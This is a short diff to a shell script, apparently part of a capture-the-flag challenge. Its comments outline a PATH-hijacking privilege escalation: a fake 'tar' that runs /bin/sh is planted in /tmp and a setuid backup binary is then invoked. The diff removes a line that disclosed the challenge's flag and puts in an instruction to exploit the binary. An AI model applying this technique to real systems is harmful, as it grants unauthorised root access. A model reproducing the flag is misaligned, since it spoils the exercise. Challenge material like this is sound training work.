@@ -6,4 +6,4 @@ echo 'Running backup...'
 # echo '/bin/sh' > /tmp/tar && chmod +x /tmp/tar
 # export PATH=/tmp:
 # /usr/local/bin/backup_agent
-# Cat /root/flag.txt -> logicCTF{su1d_pr1v1l3g3_3sc4l4t10n_r00t}
+# Exploit the binary to obtain root access and extract /root/flag.txt
